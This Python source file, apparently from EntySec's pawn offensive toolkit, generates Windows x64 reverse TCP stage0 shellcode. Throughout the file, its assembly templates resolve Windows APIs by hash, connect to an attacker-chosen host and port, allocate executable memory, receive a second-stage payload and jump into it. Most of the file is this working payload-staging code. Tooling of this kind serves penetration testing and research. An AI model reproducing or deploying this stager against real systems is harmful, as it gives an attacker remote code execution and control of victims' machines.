"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from textwrap import dedent
from typing import Optional

from pex.text import Text
from pex.socket import Socket
from pex.assembler import Assembler

from .blocks import Blocks
from .exit import Exit


class ReverseTCP(object):
    """ Subclass of pawn.windows.x64 module.

    This subclass of pawn.windows.x64 module is intended for providing
    an implementation of reverse TCP payload or stage0.
    """

    def __init__(self) -> None:
        super().__init__()

        self.exit = Exit()

        self.text = Text()
        self.assembler = Assembler()
        self.socket = Socket()

        self.blocks = Blocks()

    def get_payload(self, host: str, port: int,
                    length: Optional[int] = None, retries: int = 1,
                    reliable: bool = True, exit: str = 'thread') -> bytes:
        """ Generate reverse TCP payload or stage0.

        :param str host: reverse TCP host
        :param int port: reverse TCP port
        :param Optional[int] length: length of the second phase
        :param int retries: connection retries
        :param bool reliable: True if reliable else False
        :param str exit: exit type
        :return bytes: shellcode
        """

        payload = dedent(f"""\
        init:
            cld
            and  rsp, ~0xf
            call start

        {self.blocks.x64_api_call()}

        start:
            pop rbp

        {self.block_reverse_tcp(
            host=host,
            port=port,
            retries=retries,
            exit=exit)}

        {self.block_recv(
            length=length,
            reliable=reliable,
            exit=exit)}
        """)

        return self.assembler.assemble('x64', payload)

    def block_reverse_tcp(self, host: str, port: int,
                          retries: int = 1, exit: str = 'thread') -> str:
        """ Generate reverse TCP block.

        :param str host: reverse TCP host
        :param int port: reverse TCP port
        :param int retries: connection retries
        :param str exit: exit type
        :return str: block
        """

        host = self.socket.pack_host(host)
        port = "0x{:08x}".format(port)

        block = dedent(f"""\
        reverse_tcp:
            mov  r14, {b'ws2_32'[::-1].hex()}
            push r14
            mov  r14, rsp
            sub  rsp, 416
            mov  r13, rsp
            mov  r12, {host}{port}
            push r12
            mov  r12, rsp
            mov  rcx, r14
            mov  r10d, {self.text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
            call rbp

            mov  rdx, r13
            push 0x0101
            pop  rcx
            mov  r10d, {self.text.block_api_hash('ws2_32.dll', 'WSAStartup')}
            call rbp

            push {str(retries)}
            pop  r14

        socket:
            push rax
            push rax
            xor  r9, r9
            xor  r8, r8
            inc  rax
            mov  rcx, rax
            mov  r10d, {self.text.block_api_hash('ws2_32.dll', 'WSASocketA')}
            call rbp
            mov  rdi, rax

        connect:
            push 16
            pop  r8
            mov  rdx, r12
            mov  rcx, rdi
            mov  r10d, {self.text.block_api_hash('ws2_32.dll', 'connect')}
            call rbp
            jz   success
            dec  r14
            jnz  connect
        """)

        if exit:
            block += dedent(f"""\
            fail:
                call exit
            """)
        else:
            block += dedent(f"""\
            fail:
                push {self.text.block_api_hash('kernel32.dll', 'ExitProcess')}
                call rbp
            """)

        block += dedent(f"""\
        success:
        """)

        return block

    def block_recv(self, length: Optional[int] = None, reliable: bool = True, exit: str = 'thread') -> str:
        """ Generate recv() block.

        :param Optional[int] length: length of the second phase
        :param bool reliable: True if reliable else False
        :param str exit: exit type
        :return str: block
        """

        if length:
            block = dedent(f"""\
                push {hex(length)}
            """)
        else:
            block = dedent(f"""\
            recv:
                sub  rsp, 16
                mov  rdx, rsp
                xor  r9, r9
                push 4
                pop  r8
                mov  rcx, rdi
                mov  r10d, {self.text.block_api_hash('ws2_32.dll', 'recv')}
                call rbp
            """)

            if reliable:
                block += dedent("""\
                    cmp eax, 0
                    jle cleanup
                """)

            block += dedent("""\
                add rsp, 32
            """)

        block += dedent(f"""\
            pop  rsi
            mov  esi, esi
            push 0x40
            pop  r9
            push 0x1000
            pop  r8
            mov  rdx, rsi
            xor  rcx, rcx
            mov  r10d, {self.text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
            call rbp

            mov rbx, rax
            mov r15, rax

        read_more:
            xor  r9, r9
            mov  r8, rsi
            mov  rdx, rbx
            mov  rcx, rdi
            mov  r10d, {self.text.block_api_hash('ws2_32.dll', 'recv')}
            call rbp
        """)

        if reliable:
            block += dedent(f"""\
                cmp  eax, 0
                jge  continue
                pop  rax
                push r15
                pop  rcx
                push 0x4000
                pop  r8
                push 0
                pop  rdx
                mov  r10d, {self.text.block_api_hash('kernel32.dll', 'VirtualFree')}
                call rbp

            cleanup:
                push rdi
                pop  rcx
                mov  r10d, {self.text.block_api_hash('ws2_32.dll', 'closesocket')}
                call rbp

                dec r14
                jmp socket
            """)

        block += dedent("""\
        continue:
            add  rbx, rax
            sub  rsi, rax
            test rsi, rsi
            jnz  read_more
            jmp  r15
        """)

        if exit:
            block += self.exit.exit_block(exit)

        return block
